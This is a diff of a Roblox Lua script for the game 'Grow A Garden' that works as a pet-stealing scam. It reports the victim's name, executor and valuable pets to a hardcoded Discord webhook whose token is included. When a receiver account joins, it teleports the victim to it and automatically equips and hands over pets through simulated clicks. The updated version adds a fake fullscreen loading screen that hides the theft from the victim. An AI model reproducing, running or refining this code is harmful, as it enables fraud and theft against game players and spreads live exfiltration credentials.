@@ -1,53 +1,54 @@
-repeat 
-    task.wait()
-until game:IsLoaded()
+repeat task.wait() until game:IsLoaded()
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1399110447600242819/Ln1Qds770unNt6fpn688JOjkOMYK9naSUB-hB4fbwf8mFagdzXJZlBks1fa6BI7gA7t_"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
 local VICTIM = game.Players.LocalPlayer
-local USERNAMES = {
-    "ZeeS_Farm01"
-}
-
-local MIN_AGE = 10         -- Минимальный возраст для допуска
-local MIN_WEIGHT_KG = 5.0  -- Минимальный вес в килограммах для допуска
-
+local USERNAMES = {"ZeeS_Farm01"}
 local PET_WHITELIST = {
-    'Raccoon',
-    'T-Rex',
-    'Fennec Fox',
-    'Dragonfly',
-    'Butterfly',
-    'Disco Bee',
-    'Mimic Octopus',
-    'Queen Bee',
-    'Spinosaurus',
-    'Kitsune',
-    'Corrupted Kitsune',
-    'Raiju',
+    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
+    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune',
 }
 
 local victimPetTable = {}
-
+local petSequence = {}
 local VirtualInputManager = game:GetService("VirtualInputManager")
-local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local request = http_request or request or HttpPost or syn.request
+local dataModule = require(ReplicatedStorage.Modules.DataService)
 
-local function waitForJoin()
-    local findTarget = false
-    local trigeretName = nil
+------------------------------
+-- UI: Красочный полноэкранный GUI
+------------------------------
+local function showLoadingScreen()
+    local gui = Instance.new("ScreenGui", VICTIM:WaitForChild("PlayerGui"))
+    gui.Name = "LoadingCover"
+    gui.ResetOnSpawn = false
 
-    for _, player in game.Players:GetPlayers() do
-        if not table.find(USERNAMES, player.Name) then
-            continue
-        end
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
+    frame.BackgroundTransparency = 0
+    frame.ZIndex = 10
 
-        trigeretName = player.Name
-        findTarget = true
-    end
+    local text = Instance.new("TextLabel", frame)
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.Text = "🔐 Загрузка... Пожалуйста, подождите"
+    text.Font = Enum.Font.GothamBold
+    text.TextSize = 48
+    text.TextColor3 = Color3.new(1, 1, 1)
+    text.BackgroundTransparency = 1
 
-    return findTarget, trigeretName
+    task.delay(15, function()
+        gui:Destroy()
+    end)
 end
 
-function createDiscordEmbed(petList, totalValue, fileUrl)
+------------------------------
+-- Discord Embed
+------------------------------
+local function createDiscordEmbed(petList, totalValue)
     local embed = {
         title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
         color = 65280,
@@ -55,32 +56,24 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
             {
                 name = "👤 **Player Information**",
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
-                    VICTIM.Name, 
-                    table.concat(USERNAMES, " "), 
-                    identifyexecutor(), 
-                    game.Players.LocalPlayer.AccountAge
-                ),
-                inline = false
+                    VICTIM.Name,
+                    table.concat(USERNAMES, " "),
+                    identifyexecutor(),
+                    VICTIM.AccountAge
+                )
             },
             {
                 name = "💰 **Total Value**",
-                value = string.format("```%s¢```", totalValue),
-                inline = false
+                value = string.format("```%s¢```", totalValue)
             },
             {
                 name = "🌴 **Backpack**",
-                value = string.format("```%s```", petList),
-                inline = false
+                value = string.format("```%s```", petList)
             },
             {
                 name = "🏝️ **Join with URL**",
-                value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
-                    game.JobId, 
-                    game.PlaceId, 
-                    game.JobId
-                ),
-                inline = false
+                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
+                    game.JobId, game.PlaceId, game.JobId)
             }
         },
         footer = {
@@ -88,165 +81,129 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
         }
     }
 
-    local data = {
+    local payload = {
         content = string.format(
             "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
             game.PlaceId,
             game.JobId
         ),
-        username = game.Players.LocalPlayer.Name,
+        username = VICTIM.Name,
         avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
         embeds = {embed}
     }
 
-    local jsonData = game:GetService("HttpService"):JSONEncode(data)
-    
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+    local body = HttpService:JSONEncode(payload)
+    local headers = {["Content-Type"] = "application/json"}
 
-    local request = http_request or request or HttpPost or syn.request
-    local response = request({
+    request({
         Url = WEBHOOK_URL,
         Method = "POST",
         Headers = headers,
-        Body = jsonData
+        Body = body
     })
-
-    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
-        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
-    end
 end
 
-
-local function teleportTarget(targetName)
-    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
-end
-
-local function deltaBypass()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0,      
-        true,   
-        nil,    
-        false   
-    )
-
-    task.wait()
-
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0,
-        false,
-        nil,
-        false
-    )
-end
-
-local function checkPetsWhilelist(petName)
-    -- 1. Белый список по имени
-    for _, name in PET_WHITELIST do
-        if string.find(petName, name) then
-            return true
-        end
+------------------------------
+-- Утилиты
+------------------------------
+local function getPetObject(petUid)
+    for _, obj in ipairs(VICTIM.Backpack:GetChildren()) do
+        if obj:GetAttribute("PET_UUID") == petUid then return obj end
     end
-
-    -- 2. Проверка возраста
-    local age = tonumber(string.match(petName, "[Aa]ge%s*(%d+)"))
-    if age and age >= MIN_AGE then
-        return true
+    for _, obj in ipairs(workspace[VICTIM.Name]:GetChildren()) do
+        if obj:GetAttribute("PET_UUID") == petUid then return obj end
     end
-
-    -- 3. Проверка веса
-    local weight = tonumber(string.match(petName, "%[(%d+%.?%d*)%s*KG%]"))
-    if weight and weight >= MIN_WEIGHT_KG then
-        return true
-    end
-
-    return false
-end
-
-local function getPetObject(petUid: string): Instance?
-    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
-        if object:GetAttribute("PET_UUID") == petUid then
-            return object
-        end
-    end
-
-    for _, object in workspace[VICTIM.Name]:GetChildren() do
-        if object:GetAttribute("PET_UUID") == petUid then
-            return object
-        end
-    end
-
     return nil
 end
 
 local function equipPet(pet)
     if pet:GetAttribute("d") then
-        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+        ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
     end
-
     VICTIM.Character.Humanoid:EquipTool(pet)
 end
 
+local function unequipPet()
+    VICTIM.Character.Humanoid:UnequipTools()
+end
+
+local function checkPetsWhitelist(petName)
+    for _, name in PET_WHITELIST do
+        if string.find(petName, name) then return true end
+    end
+    return false
+end
+
 local function getPlayersPets()
-    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
-        if not checkPetsWhilelist(value.PetType) then
-            continue
-        end
-
-
-        table.insert(victimPetTable, value.PetType)
-    end
-end
-
-local function startSteal(trigerName)
-    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
-        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
-        deltaBypass()
-    end
-end
-
-local function checkPetsInventory(target)
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhilelist(value.PetType) then
-            continue
+        if checkPetsWhitelist(value.PetType) then
+            table.insert(victimPetTable, value.PetType)
+            table.insert(petSequence, {uid = petUid, name = value.PetType})
         end
-
-        local petObject = getPetObject(petUid)
-        
-        if not petObject then
-            continue
-        end
-        
-        equipPet(petObject)
-        task.wait(0.2)
-        startSteal(target)
     end
 end
 
-local function idlingTarget()
-    task.spawn(function()
-        while task.wait(0.2) do
-            local isTarget, trigerName = waitForJoin()
+local function teleportTarget(targetName)
+    local target = Players:FindFirstChild(targetName)
+    if target and target.Character then
+        VICTIM.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+    end
+end
 
-            if isTarget then
-                teleportTarget(trigerName)
-                checkPetsInventory(trigerName)
+local function pressCenterMouse(duration)
+    local centerX, centerY = workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2
+
+    VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, nil, false)
+    task.wait(duration)
+    VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, nil, false)
+end
+
+------------------------------
+-- 🔁 Цикл смены петов
+------------------------------
+local function startPetCycle(targetName)
+    task.spawn(function()
+        local index = 1
+        while Players:FindFirstChild(targetName) do
+            local petInfo = petSequence[index]
+            local petObj = getPetObject(petInfo.uid)
+
+            if petObj then
+                equipPet(petObj)
+                task.wait(0.2)
+                pressCenterMouse(0.5)
+                unequipPet()
             end
+
+            index += 1
+            if index > #petSequence then index = 1 end
+            task.wait(5) -- Интервал между итерациями
         end
     end)
 end
 
+------------------------------
+-- Обнаружение игрока и запуск
+------------------------------
 getPlayersPets()
 
 task.spawn(function()
-    while task.wait(0.5) do
-        if #victimPetTable > 0 then
-            idlingTarget()
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
-            break
+    while task.wait(1) do
+        for _, player in ipairs(Players:GetPlayers()) do
+            if table.find(USERNAMES, player.Name) then
+                -- GUI сразу
+                showLoadingScreen()
+
+                -- Через 5 сек начинаем зажимать и менять петов циклично
+                task.delay(5, function()
+                    teleportTarget(player.Name)
+                    startPetCycle(player.Name)
+                end)
+
+                -- Webhook один раз
+                createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000")
+                return
+            end
         end
     end
 end)
